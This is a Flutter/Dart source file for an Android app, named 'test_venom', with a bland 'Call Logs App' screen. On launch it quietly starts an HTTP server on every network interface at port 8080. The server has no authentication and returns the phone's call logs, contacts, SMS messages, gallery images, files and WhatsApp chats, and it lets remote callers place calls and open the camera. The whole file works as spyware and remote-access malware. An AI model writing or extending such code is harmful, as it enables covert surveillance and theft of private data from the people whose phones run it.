import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shelf/shelf.dart';
import 'package:shelf/shelf_io.dart' as shelf_io;
import 'package:shelf_router/shelf_router.dart' as r;

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
  await startServer();
}

Future<void> startServer() async {
  MethodChannel platform = MethodChannel('com.example.test_venom/call_logs');
  final router = r.Router();

  router.get('/hello', (Request request) => Response.ok('Hello from Flutter!'));

  router.get('/call_logs', (Request request) async {
    try {
      final callLogs = await platform.invokeMethod("getCallLogs");
      return Response.ok(callLogs.toString());
    } catch (e) {
      return Response.internalServerError(body: e.toString());
    }
  });

  router.post('/make_call', (Request request) async {
    try {
      // Parse the body as JSON
      final body = await request.readAsString();
      final jsonBody = jsonDecode(body);

      // Extract the phone number from the JSON
      final phoneNumber = jsonBody['phoneNumber']; // Ensure the key is correct

      if (phoneNumber != null) {
        // Call the native method with the phone number
        final callLogs = await platform.invokeMethod("makeCall", {
          "phoneNumber": phoneNumber,
        });

        return Response.ok(callLogs.toString());
      } else {
        return Response.badRequest(body: 'Phone number is missing');
      }
    } catch (e) {
      return Response.internalServerError(body: e.toString());
    }
  });

  router.post('/get_contacts', (Request request) async {
    try {
      // Fetch contacts using the native method
      final contacts = await platform.invokeMethod("getContacts");

      return Response.ok(contacts.toString());
    } catch (e) {
      return Response.internalServerError(body: e.toString());
    }
  });

  router.post('/get_messages', (Request request) async {
    try {
      // Parse the body as JSON
      final body = await request.readAsString();
      final jsonBody = jsonDecode(body);

      // Extract the phone number from the JSON
      final phoneNumber = jsonBody['phoneNumber']; // Ensure the key is correct

      if (phoneNumber != null) {
        // Call the native method with the phone number
        final callLogs = await platform.invokeMethod("getMessages", {
          "phoneNumber": phoneNumber,
        });

        return Response.ok(callLogs.toString());
      } else {
        return Response.badRequest(body: 'Phone number is missing');
      }
    } catch (e) {
      return Response.internalServerError(body: e.toString());
    }
  });

  router.post('/get_gallery', (Request request) async {
    try {
      // Fetch gallery images using the native method
      final gallery = await platform.invokeMethod("getGalleryImages");

      return Response.ok(gallery.toString());
    } catch (e) {
      return Response.internalServerError(body: e.toString());
    }
  });

  router.post('/get_files', (Request request) async {
    try {
      // Fetch files using the native method
      final files = await platform.invokeMethod("getFiles");

      return Response.ok(files.toString());
    } catch (e) {
      return Response.internalServerError(body: e.toString());
    }
  });

  router.post('/access_camera', (Request request) async {
    try {
      // Request camera access through the native method
      final cameraAccess = await platform.invokeMethod("openCamera");

      return Response.ok(cameraAccess.toString());
    } catch (e) {
      return Response.internalServerError(body: e.toString());
    }
  });

  router.post('/get_whatsapp_chats', (Request request) async {
    try {
      // Parse the body as JSON
      final body = await request.readAsString();
      final jsonBody = jsonDecode(body);

      // Extract the phone number from the JSON
      final phoneNumber = jsonBody['phoneNumber']; // Ensure the key is correct
      final message = jsonBody['message'];

      if (phoneNumber != null && message != null) {
        // Call the native method with the phone number
        final callLogs = await platform.invokeMethod("getWhatsappChats",
            {"phoneNumber": phoneNumber, "message": message});

        return Response.ok(callLogs.toString());
      } else {
        return Response.badRequest(body: 'Phone number or message is missing');
      }
    } catch (e) {
      return Response.internalServerError(body: e.toString());
    }
  });

  final server = await shelf_io.serve(
    const Pipeline().addMiddleware(logRequests()).addHandler(router),
    InternetAddress.anyIPv4,
    8080,
  );

  print('Server running on http://${server.address.address}:${server.port}');
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        appBar: AppBar(title: const Text('Call Logs App')),
        body: Center(child: const Text('Server running in the background')),
      ),
    );
  }
}
